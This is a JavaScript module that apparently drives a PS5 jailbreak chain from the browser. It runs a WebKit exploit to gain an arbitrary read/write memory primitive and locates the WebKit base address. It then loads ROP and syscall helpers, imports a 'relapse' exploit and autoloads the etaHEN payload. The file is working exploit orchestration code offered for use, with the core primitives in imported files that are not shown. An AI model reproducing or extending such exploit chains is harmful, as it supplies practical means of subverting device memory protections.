import { establishPrimitive } from "./webkit.js";
import { installWindowP } from "./utils/mem.js";
import {autoloadEtaHEN, readEtaHEN} from './autoload.js';
import {prepareShortcut} from './shortcut.js';
import {prepareOptional} from './optional.js';
import {runStartupSequence} from './startup-sequence.js';

const output = document.getElementById("console");

function writeLog(message, type = "log", replace = false) {
  let line = replace ? output.lastElementChild : null;
  if (!line) {
    line = document.createElement("div");
    output.appendChild(line);
  }
  let marker = "*";
  if (type === "error") marker = "-";
  if (type === "info" || type === "success") marker = "+";
  line.textContent = `[${marker}] ${message}`;
  output.scrollTop = output.scrollHeight;
}

function writeEvent(name, detail, type) {
  writeLog(detail == null || detail === "" ? name : `${name}: ${detail}`,
    type || (name === "Failed" ? "error" : "log"));
}

window.writeLog = writeLog;
window.jb = { mark: writeEvent };

async function getPrimitive() {
  writeLog("Starting WebKit exploit");
  const primitive = installWindowP(await establishPrimitive(writeEvent));
  if (!primitive || typeof primitive.read8 !== "function")
    throw new Error("Memory primitive unavailable");

  writeLog("ARW ready", "success");
  return primitive;
}

function getWebKitBase() {
  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor !== "number" || typeof OFFSET_wk_host_constructor_candidates === "undefined")
    throw new Error("WebKit base inputs are unavailable");

  for (const offset of OFFSET_wk_host_constructor_candidates) {
    const base = ctor - offset;
    if (base >= 0x800000000 && base < 0x900000000 && base % 0x4000 === 0)
      return base;
  }

  throw new Error("WebKit base not found");
}

function loadScript(src) {
  return new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = src;
    script.onload = resolve;
    script.onerror = () => reject(new Error('Could not load ' + src));
    document.body.appendChild(script);
  });
}

export async function run({installShortcut = false, optionalPayloads = []} = {}) {
  // Validate the full cached/downloaded image before touching console memory.
  writeLog('Checking the saved etaHEN payload…', 'info');
  const payload = await readEtaHEN();
  const shortcut = installShortcut ? await prepareShortcut() : null;
  const optional = await prepareOptional(optionalPayloads);
  await loadScript('./src/firmware.js');
  const rejection = window.firmware.rejection();
  if (rejection)
    throw new Error(rejection);
  await loadScript('./src/utils/syscalls.js');
  await loadScript('./src/rop.js');
  await loadScript('./src/main.js');
  await window.offsetsReady;
  let startupResult;
  window.autoloadEtaHEN = async (p, chain, log) => {
    startupResult = await runStartupSequence({
      etaHEN: () => autoloadEtaHEN(p, chain, log, payload),
      optional: () => optional(p, chain, log),
      shortcut: shortcut ? () => shortcut(p, chain, log) : null,
      log
    });
  };
  writeLog("Credits: ntfargo, ufm42, Sonic_Iso, Jordy, Dr. Yenyen, TheFlow, SlidyBat, Flatz, cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion", "info");
  writeLog(`Agent: ${navigator.userAgent}`, "info");
  writeLog(`Firmware: ${window.fw_str}`, "info");
  const primitive = await getPrimitive();
  writeLog(`WebKit base: 0x${getWebKitBase().toString(16)}`, "info");

  await import("./relapse_exploit.js");
  await main(primitive);
  return startupResult;
}

// Started only by the explicit Start button, never on page load.
